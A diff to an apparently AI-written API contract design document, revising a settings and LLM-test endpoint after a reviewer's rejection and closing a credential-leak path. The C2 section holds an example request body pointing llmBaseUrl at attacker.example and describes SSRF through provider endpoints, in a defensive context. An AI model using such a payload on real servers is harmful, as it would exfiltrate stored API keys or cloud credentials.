@@ -96,7 +96,12 @@ one property everybody forgets is how the key would come back.
 
 ---
 
-## 3. PUT, PATCH, and why both exist
+## 3. PUT, PATCH, and why only PATCH exists
+
+> **Superseded in part by Revision 2.** The method argument below stands and is
+> unchanged. The conclusion drawn from it — that PUT is retained as a deprecated
+> alias — was wrong and the operation is now DELETED. Read this section for the
+> reasoning, then §"Revision 2", finding 3, for the evidence that killed it.
 
 **The argument the issue asks for: should PUT become PATCH?** Yes, and the
 reason is not style.
@@ -318,7 +323,7 @@ gate is "name a specific request you tried to break":
 
 ---
 
-## 9. Gate output
+## 9. Gate output (revision 1 — superseded, see §"Revision 2" for the current run)
 
 ```
 $ python3 scripts/openapi_assemble.py
@@ -339,7 +344,10 @@ wrote contracts/openapi/MIGRATION.md
 Before this contract the same assembler reported `operations : 119`,
 `schemas : 145`, `responses : 10`, `x-uncertain : 22`.
 
-**One number does not add up and I am not going to paper over it.** This contract
+**[Revision 2: the paragraph below is WRONG and the challenger disproved it.
+The baseline was 21, not 22, because PAC-23 had already removed U-02. 21 minus
+U-18, U-19, U-20 is 18. Nothing needs reconciling. It is left here rather than
+deleted so the correction is visible.]** One number does not add up and I am not going to paper over it. This contract
 removes exactly three `x-uncertain` keys from the fragments (U-18, U-19, U-20),
 so the counter should read 19, not 18. An independent walk of the assembled
 bundle reproduces the assembler's 18, and a walk of the six fragments finds 18 —
@@ -621,3 +629,287 @@ So the next reader need not repeat these:
   the description names `llmApiKey: ""` as the way to clear. Leave them.
 - **`DailyRecapPatch` losing `nullable`.** I looked for a consumer in both repos
   and in `mcp/`; there is none. Safe.
+
+---
+
+## Revision 2 — 2026-09-17
+
+*contract-author, responding to the `contract-challenger` rejection above. The
+verdict was **reject** on three findings. All three are accepted; none is argued
+down. What follows is what changed, the evidence I re-derived myself, and the
+one change the spec must make that I am not permitted to make.*
+
+**What ran here.** `python3 scripts/openapi_assemble.py`,
+`python3 scripts/openapi_assemble.py --check`,
+`python3 scripts/openapi_migration_report.py` and
+`python3 scripts/openapi_downconvert.py` — all pure Python. Nothing else: the Go
+module proxy and the npm registry return 403 in this sandbox (factory README §8),
+so no `go build`, no test, no request against a server. Every claim below is from
+reading source and carries a `file:line`.
+
+### C2 (taken first, because it is the one that creates a vulnerability)
+
+**Accepted in full. Revision 1's `LLMTestRequest` would have introduced an
+exfiltration channel for the credential the same document declares unreadable.**
+
+I re-derived the chain rather than taking it on trust:
+
+- `backend/api/handlers_llm.go:16-21` — `testLLM` loads settings and probes them.
+  It never touches `r.Body`. **The channel does not exist today; revision 1 would
+  have created it**, which is materially worse than inheriting a defect.
+- `backend/nlp/llm_factory.go:29` —
+  `&OpenAIClient{APIKey: s.LLMAPIKey, Model: model, BaseURL: s.LLMBaseURL}`.
+  The key and the base URL come from the same struct, so anything that writes one
+  field of that struct from a request body pairs the two.
+- `backend/nlp/parser.go:31-43` — `Complete` POSTs to `base + "/v1/chat/completions"`
+  with `map[string]string{"Authorization": "Bearer " + c.APIKey}`. The 200/502
+  distinction confirms delivery.
+
+Revision 1's schema gave every endpoint property "a missing one falls back to the
+CALLER'S stored value", so
+`{"llmProvider":"openai","llmBaseUrl":"https://attacker.example"}` supplied the
+destination and the server supplied the credential.
+
+**What I did not do: adopt the challenger's suggested fix.** The challenger
+proposed `oneOf: [{maxProperties: 0}, {required: [llmProvider, llmApiKey], …}]`
+— all-or-nothing, so a submitted endpoint must arrive with the credential it is
+to be used with. That closes `openai` and `anthropic` and **leaves three
+providers open**, because on those the credential is ambient and cannot be
+submitted at all:
+
+- `backend/nlp/llm_azure_openai.go:28-50` — `AzureOpenAIClient.Complete` mints a
+  token with `azidentity.NewDefaultAzureCredential`, then sends
+  `Authorization: Bearer <token>` to `c.Endpoint`, which is `azureEndpoint`
+  verbatim. The credential is the **deployment's own cloud identity**, which is
+  worth more than the LLM key, and no `required:` clause can make a caller supply
+  it.
+- `bedrock` (`awsRegion`/`awsProfile`) and `vertex` (`gcpProject`/`gcpLocation`)
+  have the same shape: ambient credential, caller-influenced destination.
+- `ollama` carries no credential, but a submitted `ollamaBaseUrl` is still a
+  server-side request to a host of the caller's choosing — SSRF into the
+  deployment's network, available to any signed-in account, with the 200/502 as
+  an oracle.
+
+So "supply the endpoint and the credential together" is not a rule that can hold
+across all six branches. **The rule that does hold is structural: the request
+body may not contain any value that contributes to the URL the server requests.**
+
+**The fix.** `LLMTestRequest` is now a closed list of exactly three properties —
+`llmProvider`, `llmModel`, `llmApiKey` — with `additionalProperties: false`. All
+eleven endpoint properties are removed and are a 400. I checked each survivor
+against `llm_factory.go:13-58` to confirm none of them reaches a URL:
+`llmModel` is read only by the `openai` (`:25`) and `anthropic` (`:34`) branches,
+where it is a JSON body field; the URL-bearing model names — `bedrockModel`,
+`azureDeployment`, `vertexModel` — are not accepted. `llmApiKey` is only ever an
+`Authorization` header value. `llmProvider` selects a client, not a host.
+
+**Why not remove the body entirely,** which is what the handler does today and
+the strictest possible answer? Because spec AC-14 and AC-15 require a submitted
+configuration, and §3 of the spec requires that a key typed but not yet saved can
+be verified — which is load-bearing, since after this change a stored key can
+never be read back to re-submit. The three-property body serves both criteria
+with no destination surface, so the spec needs no amendment here.
+
+**The residual, recorded not fixed (factory §7).** A caller can still steer the
+probe indirectly: `PATCH /api/settings` their own `llmBaseUrl` or
+`azureEndpoint`, then probe. On `openai`/`anthropic` that sends their own key to
+their own host and is harmless. On the ambient-credential providers it sends a
+deployment-wide credential to a host they chose. **This path exists today** —
+`PUT /api/settings` plus `POST /api/llm/test` — and PAC-24 neither opens nor
+closes it. It is not in this spec's scope, so the contract says so on the
+operation and the manifest files it as `followUps.llmProbeEndpointAllowlist`
+rather than silently improving the behaviour.
+
+### C1 — `""` on the five clock properties
+
+**Accepted, and split four/one.** The challenger's evidence reproduces exactly:
+`validateSettings` skips the format check precisely when the value is empty
+(`backend/api/handlers_settings.go:75`, `if val != "" && !timePattern.MatchString(val)`),
+and every row zeroed by API-004 already holds `""` in these columns, because the
+pre-PAC-24 replace persisted each omitted property as its Go zero value. A strict
+pattern would make day-one GETs fail the contract they were generated from.
+
+**`workStart`, `workEnd`, `lunchStart`, `lunchEnd` → pattern loosened** to
+`^(([01][0-9]|2[0-3]):[0-5][0-9])?$`, the same correction already justified for
+`DaySchedule.start`/`end`. I did not treat `""` as a data defect for a migration
+to repair, for a reason the challenger's write-up does not state: for
+`lunchStart`/`lunchEnd` it is not damage at all, it is the **representation of a
+real state**. `LunchWindow` returns `enabled: false` exactly when one of them is
+empty (`backend/storage/settings.go:141-142`). A migration that "repaired" `""`
+to `12:00` would silently give a protected lunch back to every user who had
+turned it off. `WorkWindow` is the milder analogue (`:124-127`, empty falls back
+to `09:00`/`18:00`). Loosening the pattern also makes spec AC-7 satisfiable
+without amendment for these four.
+
+**`recapSendTime` → pattern stays strict, and this is the one place the spec must
+change.** It is not the same case and treating it as one would be a transcription
+rather than a decision:
+
+1. It has **no empty state**. The column is `TIME NOT NULL DEFAULT '08:00'`
+   (`015_daily_recap.up.sql:3`) and every write passes through
+   `recapSendTimeOrDefault` (`backend/storage/settings.go:356-361`), which turns
+   `""` into `08:00`. No row can hold an empty send time, so the
+   `COALESCE(recap_send_time::TEXT,'')` at `:224` and `:439` is unreachable
+   defence. Contrast `lunchStart`, where `""` is both storable and meaningful.
+2. Admitting `""` would make this contract **lie about its own merge rule**. §3
+   says a property present is stored exactly as given. `""` → `08:00` is a silent
+   substitution: the client asks to clear, gets `200`, and the server stores
+   something it did not ask for. That is the same silent-success failure mode
+   this contract refuses for `null`, and refusing it consistently is the point.
+3. So PAC-24 removes the substitution and `""` becomes the existing 400
+   `recapSendTime must be in HH:MM format` — the message spec AC-17 already
+   requires for a malformed value and AC-16 requires in place of an internal
+   failure.
+
+**The spec change I am naming and cannot make.** Spec **AC-7** says that
+supplying "an empty value of its type" clears a setting. It must be amended to
+exempt `recapSendTime`, on the ground that the setting has no empty state, with a
+sentence saying so. Without that amendment the spec and the contract disagree on
+one property and stage 4 discovers it. This is filed as
+`followUps.spec24AC7Amendment` and mirrored in `acceptanceTests` in the manifest.
+Everything else in AC-7 stands unchanged. `docs/specs/PAC-24.md` is untouched by
+this revision, per the contract-author rules.
+
+### C3 — the deprecated PUT
+
+**Accepted. `updateSettings` is deleted.** I re-ran the consumer search myself
+across both repositories and `mcp/` before agreeing, because deleting an
+operation on the challenger's word would be the same failure as keeping it on
+mine:
+
+- `mcp/client.go` — `get` (`:22`), `post` (`:43`), `patch` (`:47`), `delete`
+  (`:52`). **There is no `put` method at all**, so no MCP tool can call one.
+  The only settings tool is `clockwise_get_settings` (`mcp/tools.go:236`), a GET.
+  `clockwise_calendar_status` (`:243`) is also a GET. Nothing in `mcp/` writes
+  settings.
+- `e2e/tests/` — no settings spec; `grep -rn "api/settings" e2e/` returns
+  nothing.
+- **The one PUT consumer that does exist**, and the reason the alias was
+  proposed: `smart-calendar-flow/src/api/client.ts:813`,
+  `requestApi("PUT", "/settings", settingsRequestBody(s))`. This is exactly why
+  the alias fails. `settingsRequestBody` (`:550-563`) opens with
+  `const body = {...s}` — a spread of the snake_case `Settings` object — so the
+  body carries `work_start`, `llm_api_key` and 24 more snake_case names. PUT and
+  PATCH shared `SettingsUpdate`, which is `additionalProperties: false`. **That
+  body was a 400 on PUT exactly as on PATCH.** The alias covered the only
+  consumer it existed for, and covered it not at all.
+
+Revision 1 conceded this in its own §8.4 while the operation's description in the
+bundle claimed the opposite — and the bundle is what gets generated from, so a
+reader saw only the false version. On the method question the challenger is also
+right and I withdraw the earlier answer: `deprecated: true` documents an
+intention to remove, not a change of method semantics, and generated clients and
+any intermediary reasoning about idempotency read the method. Cost removed: a
+permanently deprecated operation, a `MIGRATION.md` row, and the
+`followUps.retirePutSettings` issue, which is deleted from the manifest.
+
+The consequence is honest and worth stating: the shipped frontend's settings
+**writes** break the moment this merges. They break either way — `additionalProperties: false`
+refuses that body on PATCH too — and today those same writes are silently
+discarded by `encoding/json`, so a 400 is strictly more informative than the
+status quo. The frontend stage is scheduled next by the factory's fixed ordering
+and spec AC-20 already owns it.
+
+### The non-blocking item: the working-hours document the client deletes silently
+
+The challenger's Responses-2 asked whether the contract should make
+`{"mode":"all_days","default":{"enabled":false,"start":"","end":""},"days":{}}`
+unrepresentable. **It already is, and the challenger's premise is the one thing
+in the review that is wrong.** `Settings.normalizeSchedules`
+(`backend/storage/settings.go:92-106`) has a second branch at `:95-99` that
+rewrites an `all_days` document whose `default` is entirely empty into
+`defaultWorkingHours(WorkStart, WorkEnd)`, and `loadScheduleFields` calls
+`normalizeSchedules` on every read path (`:495`). So GET cannot emit that
+document, and `client.ts:543` cannot be reached by it.
+
+The `by_day` arm **is** reachable, because `:95-99` guards on
+`mode == "all_days"`. `{"mode":"by_day", …, "days":{}}` normalises to itself and
+produces the identical `undefined` in `normalizeWorkingHours`
+(`smart-calendar-flow/src/api/client.ts:505-517`) and the same
+`delete out.working_hours` at `:543`. Rather than describe it — which is what
+§6 of this document says not to do — the contract refuses it at entry:
+`workingHours.days must contain at least one weekday when mode is by_day`. A
+`by_day` schedule with no days also means "this user never works", which no
+consumer intends and which `WorkWindow` already renders as `enabled: false` for
+every day (`:117-121`). Neither test in
+`backend/api/handlers_settings_schedule_test.go` uses that shape, so spec §6's
+promise that both keep passing unchanged holds — I checked both.
+
+### Two more challenger findings fixed while here
+
+- **Requests-2, dead weekday keys.** `propertyNames: {enum: [monday…sunday]}` is
+  added to `WorkingHoursSchedule.days` and to `LunchBreakSchedule`. The
+  validator lowercases before checking (`handlers_settings.go:145`, `:154`) but
+  the readers look up an already-lowercased key
+  (`storage/settings.go:117`, `:138`), so `"Monday"` validates, stores, and never
+  matches — and under whole-object replace the write that installs the dead key
+  deletes the live one it replaced.
+  **Generator caveat, flagged for stage 4:** `propertyNames` is an OpenAPI 3.1 /
+  JSON Schema 2020-12 keyword. I ran `scripts/openapi_downconvert.py` and it
+  copies the keyword verbatim into the 3.0.3 rendering (exit 0), but kin-openapi
+  does not model `propertyNames`, so the generated Go validator very likely
+  ignores it. **The handler checks at `:145` and `:154` must not be deleted as
+  redundant.** Filed as `followUps.propertyNamesGeneratorFidelity`.
+- **Requests-3, `mode: ""`.** The enum is now `['', all_days, by_day]`. Revision
+  1 had a schema disagreeing with its own description two lines below it. The
+  server accepts `""` (`handlers_settings.go:129`) and the contract describes
+  what is, not what should be (factory §7). The conditional — `""` only when
+  `days` is empty — stays a documented 400
+  (`workingHours.mode is required when day-specific hours are provided`,
+  `:132-134`) because it is cross-property and because narrowing it would be a
+  new rejection that spec §6 forbids.
+
+### What I accepted from "Verified clean" without re-checking
+
+The challenger's `x-uncertain` arithmetic (baseline 21 after PAC-23, not 22, so
+21 − 3 = 18), the API-013 counts, the `getAuthStatus` description, the
+`DaySchedule` widening, and the judgement that `additionalProperties: false` is
+acceptable once C3 is fixed. §9's "one number does not add up" paragraph is
+marked as disproved in place rather than deleted. C3 is fixed, so the
+`additionalProperties: false` judgement now stands as argued.
+
+### Gate output — revision 2
+
+```
+$ python3 scripts/openapi_assemble.py
+wrote contracts/openapi/openapi.yaml
+  paths      : 98
+  operations : 119  (14 public, 105 authenticated)
+  schemas    : 146
+  responses  : 11
+  parameters : 8
+  securitySchemes: 2
+  x-uncertain: 18
+
+$ python3 scripts/openapi_assemble.py --check
+OK: bundle is in sync (98 paths)
+exit=0
+
+$ python3 scripts/openapi_migration_report.py
+wrote contracts/openapi/MIGRATION.md
+  operations : 119  (0 generated, 119 handwritten)
+```
+
+`operations` falls 120 → 119 and `authenticated` 106 → 105: that is
+`PUT /api/settings` leaving. `schemas` stays 146 — `LLMTestRequest` is narrowed,
+not removed. `x-uncertain` stays 18, as the challenger's arithmetic predicts.
+
+### The manifest hash, and how it was computed
+
+The challenger found the PAC-23 manifest carrying a hash that no longer matches
+its bundle. To avoid repeating it, `contractHash` here is the sha256 of
+`contracts/openapi/openapi.yaml` **as this revision leaves it**, computed after
+the final assembler run and after `--check` returned exit 0 — so it is the hash
+of a bundle proven in sync with the fragments, not of a stale working copy.
+Reproduce with:
+
+```
+python3 scripts/openapi_assemble.py
+python3 scripts/openapi_assemble.py --check
+sha256sum contracts/openapi/openapi.yaml
+```
+
+`contractRevision` is `2`; `contractHash` is
+`9fdb862475219fba6cf34d61db3b9186ce52db264e562cddf95225aa6a3f5f3d`.
+`contractHashOf` in the manifest carries this procedure verbatim so the next
+reader can check it in one command.
